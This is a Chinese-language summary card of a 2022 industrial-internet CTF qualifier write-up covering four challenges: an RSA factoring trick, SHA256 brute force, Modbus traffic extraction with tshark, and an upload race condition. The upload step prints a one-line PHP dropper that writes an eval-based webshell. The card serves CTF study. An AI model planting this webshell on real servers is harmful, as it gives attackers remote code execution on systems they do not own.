---
title: "中国工业互联网江苏省选拔赛 writeup"
category: misc
tags: ["中国工业互联网", "misc", "RSA-Quadratic", "hash-sha256-brute", "modbus-pcap", "upload-race"]
signals: ["中国工业互联网 2022", "RSA-Quadratic", "hash-sha256-brute", "modbus-pcap", "upload-race", "PHP-webshell", "quadratic-formula", "iroot", "crypto_rsa", "RSA", "I-1", "SHA256", "modbus", "upload"]
difficulty: medium
source: "https://www.ctfiot.com/73808.html"
tools: ["PHP", "tshark"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 中国工业互联网江苏省选拔赛 writeup

> 赛事：中国工业互联网 2022 | 方向：misc | 难度：medium | 工具：PHP、tshark

## 一句话总结

江苏省工控选拔赛 4 题：RSA 二次方程求 p + e=2^I-1 开方 + SHA256 8 位爆破 + modbus 流量 + upload 竞争条件。

## 攻击链

1. Crypto: RSA 二次方程求 p (p+q = 2^I + 31336), 用 iroot 求平方根
2. quadratic(1, -(2^I + 31336), n) 找 I ∈ [10, 2050]
3. e = int('1'*I, 2) (e 是 2^I-1 形式), 找 e 满足 gcd(e,phi)!=1
4. m = pow(c, d, n) 后开 g 次方根 (因为 e/g = d·m)
5. 找到 m 中含 "flag" 输出
6. Hash 爆破: num = ''86139'' + 8位数字, SHA256 = ''2704efd1382cb3c01cb7962e5b8b06d5dcbe427a61460fb333e126fb646dc108
7. 工控: tshark -r 1667353056652.pcapng -Y "ip.src==192.168.111.138 && modbus.func_code==6" 提取数据
8. Web: upload.php 竞争条件 + encode_multipart_formdata + 1.php 木马 ''<?php fputs(fopen("a.php","w"),"<?php @eval($_POST[1])?>"); ?>
9. 多线程 while 1: t=threading.Thread(a/b); t.start()

## 关键 payload

```
quadratic(1, -(2^I+31336), n) + int("1"*I, 2) + tshark modbus.func_code 6 + upload race
```

## 经验教训

工控场景下 RSA 密码学 + pcap 流量 + 竞争条件上传 + Hash 爆破是常见组合。

## 标签

RSA-Quadratic、hash-sha256-brute、modbus-pcap、upload-race、PHP-webshell、quadratic-formula、iroot

## 参考来源

- https://www.ctfiot.com/73808.html
- 原文件：中国工业互联网江苏省选拔赛writeup.full.md
